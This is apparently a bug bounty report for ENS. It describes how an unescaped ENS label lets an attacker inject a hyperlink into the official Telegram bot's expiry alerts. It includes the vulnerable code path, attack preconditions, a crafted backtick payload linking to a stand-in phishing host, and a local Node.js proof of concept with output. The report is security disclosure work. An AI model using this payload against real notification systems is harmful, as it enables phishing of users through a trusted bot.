# 90584 w a insight unescaped ens label injected into markdown parsed telegram notifications allows an attacker to place arbitrary hyperlinks in first party ens bot messages

**Submitted on Aug 25th 2026 at 18:59:29 UTC by @Another for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #90584
* **Report Type:** Websites & Apps
* **Report severity:** Insight
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/workers>
* **Impacts:**
  * Redirecting users to malicious websites (open redirect)

## Description

## Brief/Intro

`workers/api-worker` renders ENS expiry notifications into Telegram messages using `parse_mode: 'Markdown'`. The ENS name is interpolated into the message body inside backticks with no escaping and no validation.

An ENS label is attacker-controlled: ENSv2 contracts impose no character constraints on labels. An attacker who registers a label containing a backtick can close the code span the template opened, emit arbitrary Telegram Markdown — including a `[text](url)` hyperlink — and re-open a code span so the entities stay balanced and Telegram accepts the message.

Because ENS name transfers are push-based, the attacker can move the malicious name into a victim's ownership unilaterally. The expiry pipeline then notifies the victim as the owner. No victim interaction is required beyond having Telegram notifications enabled.

## Vulnerability Details

{% stepper %}
{% step %}

## The sink — `services/delivery/templates/telegram.ts`

`payload.name` is interpolated raw, inside a backtick code span, and the message is declared as Markdown:

```ts
'name-expiry': (payload) => {
  const daysLeft = Math.ceil((payload.expiryDate - Date.now()) / (1000 * 60 * 60 * 24))

  const ownerText = payload.isOwner
    ? `Your domain \`${payload.name}\` will expire in *${daysLeft} days*.\n\n...`
    : `The domain \`${payload.name}\` you're watching will expire in *${daysLeft} days*.`

  return {
    text: `⚠️ *Domain Expiration Alert*\n\n${ownerText}`,
    parseMode: 'Markdown',
    buttons: [[{ text: '🔄 Renew Now', url: `https://app.ens.domains/${payload.name}` }]],
  }
}
```

{% endstep %}

{% step %}

## `parseMode` reaches the Telegram API — `services/delivery/telegram.ts`

```ts
const message = template(deliveryJob.notification.payload as AnyPersonalNotificationPayload)

const result = yield* makeTelegramRequest(botToken, 'sendMessage', {
  chat_id: deliveryJob.target,
  text: message.text,
  parse_mode: message.parseMode,   // 'Markdown'
  reply_markup: replyMarkup,
})
```

{% endstep %}

{% step %}

## No validation anywhere on the path — the module interaction

This is the cross-module part. Each hop individually looks reasonable; the name is never validated at any of them.

`services/expiry-discovery/indexer.ts` — the name arrives from the ENS indexer as a bare string:

```ts
const indexerResponseSchema = v.object({
  domains: v.array(
    v.object({
      name: v.string(),        // <-- no format constraint
      expiryDate: v.number(),
      owner: v.nullable(v.object({ id: v.nullable(v.string()) })),
    }),
  ),
})
```

`types/events/index.ts` — still unconstrained when it becomes a queue event:

```ts
export const expiryEventSchema = v.object({
  type: v.literal('name_expiring'),
  name: v.string(),            // <-- no format constraint
  expiryDate: v.number(),
  stage: expiryStageIdSchema,
  owner: v.optional(v.string()),
  includeFavorites: v.boolean(),
})
```

`queues/event-ingestion.ts` — `collectRecipientsForEvent` resolves the on-chain owner to an app user (the `'owned'` recipient), and `processExpiryEvents` then persists the raw name verbatim into `notifications.payload.name`, with no sanitisation:

```ts
// collectRecipientsForEvent — owner → user resolution (the victim, no interaction)
if (event.owner) {
  const ownerUserId = ownerToUserId.get(event.owner.toLowerCase())
  if (ownerUserId) recipients.set(ownerUserId, 'owned')
}

// processExpiryEvents — raw name written straight into the stored payload
notificationsToInsert.push({
  user_id: userId,
  kind: 'name-expiry',
  payload: { name: event.name, /* raw */ expiryDate: event.expiryDate * 1000, isOwner: watchReason === 'owned', watchReason },
  idempotency_key: idempotencyKey,
})
```

`packages/shared-schema/src/notifications/kinds/name-expiry.ts` — even the first-party payload contract that defines this notification leaves the name unconstrained (`name: v.string()`), so the name is an unvalidated `v.string()` at every boundary it crosses.

The payload is then read back verbatim in `deliverTelegramNotification` and handed to the template. Note that a validator does exist in the same worker — `isValidDomain` / `formatDomainName` in `services/telegram/utils.ts` — but neither is ever called on the delivery path, so `payload.name` reaches the Markdown sink unfiltered (the fix is one function call away).
{% endstep %}

{% step %}

## Why the injection parses

The template emits ``The domain `NAME` you're watching…``. With:

```
NAME = a`[⚠️ RENEW NOW — action required](https://ens-renew.example)`b.eth
```

The rendered text becomes:

```
The domain `a`[⚠️ RENEW NOW — action required](https://ens-renew.example)`b.eth` you're watching will expire in 30 days.
```

Four backticks — two balanced code spans (`a` and `b.eth`) with a `text_link` entity between them. Entities are balanced, so Telegram accepts the message rather than returning `Bad Request: can't parse entities`.
{% endstep %}

{% step %}

## Secondary — unencoded name in the inline-keyboard URL

The same template builds `url: https://app.ens.domains/${payload.name}` without `encodeURIComponent`. The host cannot be changed (the authority is already fixed by `//app.ens.domains`), so this is not a redirect primitive. It does mean a label containing characters Telegram rejects in a button URL causes `sendMessage` to fail, dropping the notification entirely. Worth fixing alongside, not a finding on its own.
{% endstep %}
{% endstepper %}

## Impact Details

An attacker can cause the official ENS Telegram bot to deliver a message containing arbitrary text and an arbitrary clickable hyperlink to a targeted user. The message carries full first-party provenance — it arrives in the same bot conversation the user verified, styled identically to legitimate expiry alerts, immediately adjacent to a genuine "🔄 Renew Now" button.

The injected content sits inside a real, correctly-timed expiry alert for a name the victim genuinely owns, which removes the usual signals that would make a user suspicious.

Preconditions:

1. The victim is a registered app user (their address is in the `users` table) with a verified Telegram channel and `owned_name_expiry` enabled. The owner branch only fires when the name's on-chain owner resolves to such a user — this is not a broadcast to arbitrary Telegram users.
2. The attacker registers an on-chain ENS label containing a backtick.
3. The attacker transfers that name to the victim (unilateral — ENS token transfers to an EOA do not require acceptance) and lets it enter an expiry window (`30d` / `7d` / `1d` / `expired`).

An alternative path needs no transfer: if the victim favourites the attacker's name, `includeFavorites` routes the same injected message via the `favourited` branch (gated on `favourited_name_expiry`). An attacker who both owns and favourites their own malicious name satisfies the recipient conditions itself, which is enough to drive the pipeline end-to-end.

Bounded by: no script execution is possible — Telegram Markdown yields text, bold, code and links only. The impact ceiling is a credible attacker-controlled link, not account compromise.

## References

* `workers/api-worker/src/services/delivery/templates/telegram.ts` — injection sink (`name-expiry`, both `isOwner` branches)
* `workers/api-worker/src/services/delivery/telegram.ts` — `parse_mode` passthrough
* `workers/api-worker/src/services/expiry-discovery/indexer.ts` — `name: v.string()`
* `workers/api-worker/src/types/events/index.ts` — `expiryEventSchema`
* `workers/api-worker/src/queues/event-ingestion.ts` — `collectRecipientsForEvent` (owner branch) + `processExpiryEvents` (raw `payload.name` insert)
* `packages/shared-schema/src/notifications/kinds/name-expiry.ts` — `payloadSchema` with `name: v.string()` (fourth unvalidated boundary)
* Telegram Bot API, Formatting options (legacy `Markdown`): <https://core.telegram.org/bots/api#markdown-style>
* The codebase's own statement that labels are unconstrained — `apps/portal/src/utils/token/isNameOrAddress.ts`:

  > "the ENSv2 contracts impose no character constraints on labels (only a 1–255 byte length), so the actual client-side rule is ENSIP-15 normalization"

## Proof of Concept

Create a test file `poc-telegram-injection.mjs` and paste the test below into it. It copies the shipped template verbatim and scans the output with a minimal Telegram legacy-Markdown entity parser.

````js
/**
 * PoC: Telegram Markdown injection via an attacker-controlled ENS label.
 *
 * Reproduces, verbatim, the template from
 *   workers/api-worker/src/services/delivery/templates/telegram.ts
 * and the send call from
 *   workers/api-worker/src/services/delivery/telegram.ts
 *
 * The only untrusted input is `payload.name`, which reaches this code as
 * `v.string()` (no format validation) from the ENS indexer via
 *   services/expiry-discovery/indexer.ts -> types/events/index.ts
 *   -> queues/event-ingestion.ts -> notifications.payload
 */

// ---- verbatim copy of the shipped template -------------------------------
const nameExpiryTemplate = (payload) => {
  const daysLeft = Math.ceil(
    (payload.expiryDate - Date.now()) / (1000 * 60 * 60 * 24),
  )

  const ownerText = payload.isOwner
    ? `Your domain \`${payload.name}\` will expire in *${daysLeft} days*.\n\nDon't forget to renew your domain!`
    : `The domain \`${payload.name}\` you're watching will expire in *${daysLeft} days*.`

  return {
    text: `⚠️ *Domain Expiration Alert*\n\n${ownerText}`,
    parseMode: 'Markdown',
    buttons: [[{ text: '🔄 Renew Now', url: `https://app.ens.domains/${payload.name}` }]],
  }
}

// ---- minimal Telegram legacy-Markdown entity scanner ----------------------
// Telegram "Markdown" (legacy) supports: *bold*, _italic_, `code`, ```pre```,
// [text](url). We scan for balanced code spans and link entities the same way,
// to show what the user actually sees.
function parseLegacyMarkdown(s) {
  const entities = []
  let i = 0
  let visible = ''
  while (i < s.length) {
    const ch = s[i]
    if (ch === '`') {
      const end = s.indexOf('`', i + 1)
      if (end !== -1) {
        entities.push({ type: 'code', text: s.slice(i + 1, end) })
        visible += s.slice(i + 1, end)
        i = end + 1
        continue
      }
    }
    if (ch === '[') {
      const close = s.indexOf(']', i + 1)
      if (close !== -1 && s[close + 1] === '(') {
        const urlEnd = s.indexOf(')', close + 2)
        if (urlEnd !== -1) {
          const label = s.slice(i + 1, close)
          const url = s.slice(close + 2, urlEnd)
          entities.push({ type: 'text_link', text: label, url })
          visible += label
          i = urlEnd + 1
          continue
        }
      }
    }
    if (ch === '*') {
      const end = s.indexOf('*', i + 1)
      if (end !== -1) {
        entities.push({ type: 'bold', text: s.slice(i + 1, end) })
        visible += s.slice(i + 1, end)
        i = end + 1
        continue
      }
    }
    visible += ch
    i++
  }
  return { visible, entities }
}

const EXPIRY = Date.now() + 30 * 24 * 60 * 60 * 1000

console.log('='.repeat(72))
console.log('BASELINE — benign name')
console.log('='.repeat(72))
const benign = nameExpiryTemplate({ name: 'alice.eth', expiryDate: EXPIRY, isOwner: false })
console.log('raw text sent to Telegram:\n' + benign.text + '\n')
console.log('rendered entities:', JSON.stringify(parseLegacyMarkdown(benign.text).entities, null, 2))

console.log('\n' + '='.repeat(72))
console.log('ATTACK — ENS label containing a backtick + link syntax')
console.log('='.repeat(72))

// A single on-chain label. ENSv2 contracts impose no charset constraint on
// labels (only a 1-255 byte length) - see the codebase's own note in
// apps/portal/src/utils/token/isNameOrAddress.ts
const MALICIOUS = 'a`[⚠️ RENEW NOW — action required](https://ens-renew.example)`b.eth'

const evil = nameExpiryTemplate({ name: MALICIOUS, expiryDate: EXPIRY, isOwner: false })
console.log('raw text sent to Telegram:\n' + evil.text + '\n')

const parsed = parseLegacyMarkdown(evil.text)
console.log('what the victim SEES:\n' + parsed.visible + '\n')
console.log('rendered entities:')
for (const e of parsed.entities) {
  console.log(`  - ${e.type.padEnd(10)} ${JSON.stringify(e.text)}${e.url ? '  ->  ' + e.url : ''}`)
}

const injectedLink = parsed.entities.find((e) => e.type === 'text_link')
console.log('\nRESULT:', injectedLink
  ? `INJECTED HYPERLINK -> ${injectedLink.url} (label: "${injectedLink.text}")`
  : 'no injection')

console.log('\n' + '='.repeat(72))
console.log('SECONDARY — unencoded name in the inline-keyboard button URL')
console.log('='.repeat(72))
console.log('button url:', evil.buttons[0][0].url)
try {
  new URL(evil.buttons[0][0].url)
  console.log('URL parsed OK')
} catch (e) {
  console.log('URL is malformed ->', e.message)
}

console.log('\n' + '='.repeat(72))
````

Run: `node poc-telegram-injection.mjs` (Node ≥ 18, no dependencies)

### Logs

```
========================================================================
BASELINE — benign name
========================================================================
raw text sent to Telegram:
⚠️ *Domain Expiration Alert*

The domain `alice.eth` you're watching will expire in *30 days*.

rendered entities: [
  { "type": "bold", "text": "Domain Expiration Alert" },
  { "type": "code", "text": "alice.eth" },
  { "type": "bold", "text": "30 days" }
]

========================================================================
ATTACK — ENS label containing a backtick + link syntax
========================================================================
raw text sent to Telegram:
⚠️ *Domain Expiration Alert*

The domain `a`[⚠️ RENEW NOW — action required](https://ens-renew.example)`b.eth` you're watching will expire in *30 days*.

what the victim SEES:
⚠️ Domain Expiration Alert

The domain a⚠️ RENEW NOW — action requiredb.eth you're watching will expire in 30 days.

rendered entities:
  - bold       "Domain Expiration Alert"
  - code       "a"
  - text_link  "⚠️ RENEW NOW — action required"  ->  https://ens-renew.example
  - code       "b.eth"
  - bold       "30 days"

RESULT: INJECTED HYPERLINK -> https://ens-renew.example (label: "⚠️ RENEW NOW — action required")
```
